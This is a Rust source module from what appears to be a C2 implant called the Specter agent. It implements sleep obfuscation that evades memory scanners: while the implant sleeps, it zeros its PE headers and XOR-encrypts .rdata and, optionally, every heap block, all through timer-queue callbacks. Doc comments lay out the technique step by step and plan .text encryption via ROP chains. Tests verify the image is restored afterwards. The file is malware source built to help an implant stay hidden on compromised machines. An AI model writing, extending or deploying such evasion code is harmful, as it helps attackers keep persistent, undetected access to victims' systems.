//! Sleep obfuscation for the Specter agent.
//!
//! Implements Cronos-style timer-callback sleep obfuscation: XOR-encrypts the
//! PE headers and the `.rdata` section during the sleep window using Windows
//! timer-queue callbacks. No agent threads are suspended — the calling thread
//! parks itself in `WaitForSingleObject` (a kernel wait) while two timer-pool
//! callbacks perform the encrypt → sleep → decrypt sequence.
//!
//! # Technique identifiers
//!
//! | Value | Constant                      | Description                                      |
//! |-------|-------------------------------|--------------------------------------------------|
//! | 0     | [`SLEEP_TECHNIQUE_NONE`]      | Plain sleep, no obfuscation                      |
//! | 1     | [`SLEEP_TECHNIQUE_CRONOS`]    | Timer-callback PE stomp + XOR                    |
//! | 2     | [`SLEEP_TECHNIQUE_HEAP_ENC`]  | Cronos + heap block XOR encryption at rest       |
//!
//! # Windows implementation notes
//!
//! On Windows, [`SLEEP_TECHNIQUE_CRONOS`] does the following:
//!
//! 1. Locates the agent module image via `GetModuleHandleW(NULL)`.
//! 2. Backs up the first page of PE headers (DOS + NT + section table).
//! 3. Finds the `.rdata` section (read-only data: strings, vtables, config).
//! 4. Generates a fresh 32-byte random XOR key.
//! 5. Creates a timer queue and schedules two one-shot callbacks:
//!    - **Encrypt callback** (T = 0 ms): change header page to RW, zero headers;
//!      change `.rdata` to RW, XOR-encrypt with the random key.
//!    - **Decrypt callback** (T = `duration_ms`): XOR-decrypt `.rdata`, restore
//!      protection; restore PE headers from backup, restore protection; signal
//!      the completion event.
//! 6. Parks the calling thread on `WaitForSingleObject(done_event)`.
//! 7. Cleans up the timer queue and event handle.
//!
//! # Limitations
//!
//! The `.text` section (agent code) is **not** encrypted during sleep. Doing
//! so would require a position-independent decrypt stub residing outside the
//! module image — this is the approach used by Demon's Ekko/Zilean ROP chains
//! and is tracked for Specter in a follow-up issue.
//!
//! On non-Windows targets (Linux CI cross-compile), both techniques fall back
//! to a plain Tokio sleep.

use std::time::Duration;

#[cfg(windows)]
#[allow(unsafe_code)]
mod cronos;

/// Technique identifier: plain sleep, no obfuscation.
pub const SLEEP_TECHNIQUE_NONE: u32 = 0;

/// Technique identifier: Cronos-style timer-callback obfuscation.
///
/// On Windows: backs up and zeros the PE headers and XOR-encrypts the
/// `.rdata` section while the agent is sleeping. On non-Windows builds,
/// falls back to a plain Tokio sleep.
pub const SLEEP_TECHNIQUE_CRONOS: u32 = 1;

/// Technique identifier: Cronos obfuscation **plus** heap encryption at rest.
///
/// On Windows: performs all steps of [`SLEEP_TECHNIQUE_CRONOS`] and
/// additionally XOR-encrypts the contents of every allocated block in the
/// default process heap for the duration of the sleep window.  The heap key
/// is generated fresh each sleep cycle and is independent of the `.rdata`
/// key.
///
/// # Safety note
///
/// Heap encryption corrupts in-flight allocations for any thread that
/// accesses heap memory during the sleep window.  This technique is only
/// safe when the agent is the sole active thread (or when all other threads
/// have been suspended before the sleep begins).  In a multi-threaded
/// runtime (e.g. a full Tokio executor) use this technique only if you
/// understand the consequences.
///
/// On non-Windows builds falls back to a plain Tokio sleep.
pub const SLEEP_TECHNIQUE_HEAP_ENC: u32 = 2;

/// Perform an optionally obfuscated sleep.
///
/// When `technique` is [`SLEEP_TECHNIQUE_CRONOS`] on Windows, timer-queue
/// callbacks encrypt the agent's read-only data section and stomp the PE
/// headers while the agent is sleeping. All obfuscation is transparent to
/// the caller; the function returns only after decryption is complete.
///
/// Falls back to a plain Tokio sleep on non-Windows targets, on
/// [`SLEEP_TECHNIQUE_NONE`], or when the Windows obfuscation path fails
/// (with a warning log).
///
/// A zero-duration sleep is a no-op regardless of technique.
pub async fn obfuscated_sleep(duration_ms: u64, technique: u32) {
    if duration_ms == 0 {
        return;
    }

    #[cfg(windows)]
    if technique == SLEEP_TECHNIQUE_CRONOS || technique == SLEEP_TECHNIQUE_HEAP_ENC {
        use tracing::warn;
        let heap_enc = technique == SLEEP_TECHNIQUE_HEAP_ENC;

        // Guard: heap encryption XOR-scrambles every live heap allocation for
        // the duration of the sleep window.  That is only safe when no other
        // thread accesses heap memory during the window.  In a Tokio
        // multi-threaded runtime the async worker threads keep running while
        // spawn_blocking executes, so concurrent heap accesses corrupt
        // arbitrary in-flight data.  Detect this and downgrade to
        // SLEEP_TECHNIQUE_CRONOS (PE-header + .rdata obfuscation only, which
        // does not touch heap allocations) rather than silently corrupting
        // memory.
        let heap_enc = if heap_enc {
            let num_workers = tokio::runtime::Handle::current().metrics().num_workers();
            if num_workers > 1 {
                warn!(
                    num_workers,
                    "SLEEP_TECHNIQUE_HEAP_ENC requested in a {num_workers}-worker Tokio \
                     runtime; downgrading to SLEEP_TECHNIQUE_CRONOS to prevent heap corruption"
                );
                false
            } else {
                heap_enc
            }
        } else {
            heap_enc
        };

        match tokio::task::spawn_blocking(move || cronos::cronos_sleep(duration_ms, heap_enc)).await
        {
            Ok(Ok(())) => return,
            Ok(Err(e)) => {
                warn!("sleep obfuscation failed ({e}); falling back to plain sleep");
            }
            Err(_) => {
                warn!("sleep obfuscation task panicked; falling back to plain sleep");
            }
        }
    }

    // On non-Windows builds the technique parameter has no effect; all
    // techniques fall back to a plain Tokio sleep.
    #[cfg(not(windows))]
    let _ = technique;

    tokio::time::sleep(Duration::from_millis(duration_ms)).await;
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Zero-duration sleeps should return immediately for any technique.
    #[tokio::test]
    async fn zero_duration_is_noop() {
        let start = std::time::Instant::now();
        obfuscated_sleep(0, SLEEP_TECHNIQUE_NONE).await;
        obfuscated_sleep(0, SLEEP_TECHNIQUE_CRONOS).await;
        obfuscated_sleep(0, 99).await;
        // All three calls should complete well under 100 ms combined.
        assert!(
            start.elapsed().as_millis() < 100,
            "zero-duration sleep took too long: {} ms",
            start.elapsed().as_millis()
        );
    }

    /// `SLEEP_TECHNIQUE_NONE` must sleep for at least the requested duration.
    #[tokio::test]
    async fn plain_sleep_respects_duration() {
        let start = std::time::Instant::now();
        obfuscated_sleep(50, SLEEP_TECHNIQUE_NONE).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 50, "plain sleep completed too early: {ms} ms");
    }

    /// Unknown technique identifiers must fall back to a plain sleep.
    #[tokio::test]
    async fn unknown_technique_falls_back_to_plain_sleep() {
        let start = std::time::Instant::now();
        obfuscated_sleep(50, 42).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 50, "unknown-technique sleep completed too early: {ms} ms");
    }

    /// All three technique constants must be distinct.
    #[test]
    fn technique_constants_are_distinct() {
        assert_ne!(SLEEP_TECHNIQUE_NONE, SLEEP_TECHNIQUE_CRONOS);
        assert_ne!(SLEEP_TECHNIQUE_NONE, SLEEP_TECHNIQUE_HEAP_ENC);
        assert_ne!(SLEEP_TECHNIQUE_CRONOS, SLEEP_TECHNIQUE_HEAP_ENC);
    }

    /// On non-Windows, [`SLEEP_TECHNIQUE_HEAP_ENC`] must fall back to plain
    /// sleep and still respect the requested duration.
    #[cfg(not(windows))]
    #[tokio::test]
    async fn heap_enc_falls_back_on_non_windows() {
        let start = std::time::Instant::now();
        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 50, "HeapEnc fallback sleep completed too early: {ms} ms");
    }

    /// On Windows, [`SLEEP_TECHNIQUE_HEAP_ENC`] must sleep for the full
    /// requested duration and restore the module image correctly.
    #[cfg(windows)]
    #[tokio::test]
    async fn heap_enc_sleep_respects_duration_on_windows() {
        let start = std::time::Instant::now();
        obfuscated_sleep(100, SLEEP_TECHNIQUE_HEAP_ENC).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 100, "HeapEnc sleep completed too early: {ms} ms");
    }

    /// Verify that the PE image is intact after a heap-enc sleep on Windows.
    #[cfg(windows)]
    #[tokio::test]
    async fn heap_enc_sleep_restores_pe_headers() {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

        let magic_before = unsafe {
            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
            [*base, *base.add(1)]
        };

        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;

        let magic_after = unsafe {
            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
            [*base, *base.add(1)]
        };

        assert_eq!(magic_before, magic_after, "PE MZ magic was not restored after HeapEnc sleep");
        assert_eq!(magic_after, [b'M', b'Z'], "MZ magic does not match expected value");
    }

    /// On non-Windows, [`SLEEP_TECHNIQUE_CRONOS`] must fall back to plain
    /// sleep and still respect the requested duration.
    #[cfg(not(windows))]
    #[tokio::test]
    async fn cronos_falls_back_on_non_windows() {
        let start = std::time::Instant::now();
        obfuscated_sleep(50, SLEEP_TECHNIQUE_CRONOS).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 50, "Cronos fallback sleep completed too early: {ms} ms");
    }

    /// On Windows, [`SLEEP_TECHNIQUE_CRONOS`] must sleep for the full
    /// requested duration and restore the module image correctly.
    #[cfg(windows)]
    #[tokio::test]
    async fn cronos_sleep_respects_duration_on_windows() {
        let start = std::time::Instant::now();
        obfuscated_sleep(100, SLEEP_TECHNIQUE_CRONOS).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 100, "Cronos sleep completed too early: {ms} ms");
    }

    /// Verify that the PE image is intact after a Cronos sleep on Windows.
    #[cfg(windows)]
    #[tokio::test]
    async fn cronos_sleep_restores_pe_headers() {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;

        // Snapshot the first two bytes (MZ magic) before the obfuscated sleep.
        let magic_before = unsafe {
            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
            [*base, *base.add(1)]
        };

        obfuscated_sleep(50, SLEEP_TECHNIQUE_CRONOS).await;

        // After the sleep, the MZ magic must be restored.
        let magic_after = unsafe {
            let base = GetModuleHandleW(std::ptr::null()) as *const u8;
            [*base, *base.add(1)]
        };

        assert_eq!(magic_before, magic_after, "PE MZ magic was not restored after Cronos sleep");
        assert_eq!(magic_after, [b'M', b'Z'], "MZ magic does not match expected value");
    }

    /// [`SLEEP_TECHNIQUE_HEAP_ENC`] must complete without panic or corruption
    /// when called from inside a multi-threaded Tokio runtime.
    ///
    /// On Windows the multi-worker guard downgrades the technique to CRONOS;
    /// on all other platforms the plain-sleep fallback is used.  Either way
    /// the function must sleep for at least the requested duration.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn heap_enc_is_safe_in_multi_thread_runtime() {
        let start = std::time::Instant::now();
        obfuscated_sleep(50, SLEEP_TECHNIQUE_HEAP_ENC).await;
        let ms = start.elapsed().as_millis();
        assert!(ms >= 50, "HeapEnc sleep in multi-thread runtime completed too early: {ms} ms");
    }

    /// When the Tokio runtime has more than one worker, the number of workers
    /// reported by `Handle::current().metrics().num_workers()` must be > 1 so
    /// the guard condition triggers correctly.
    #[tokio::test(flavor = "multi_thread", worker_threads = 4)]
    async fn tokio_metrics_report_multiple_workers_in_mt_runtime() {
        let num_workers = tokio::runtime::Handle::current().metrics().num_workers();
        assert!(
            num_workers > 1,
            "expected > 1 Tokio workers in multi_thread runtime, got {num_workers}"
        );
    }
}
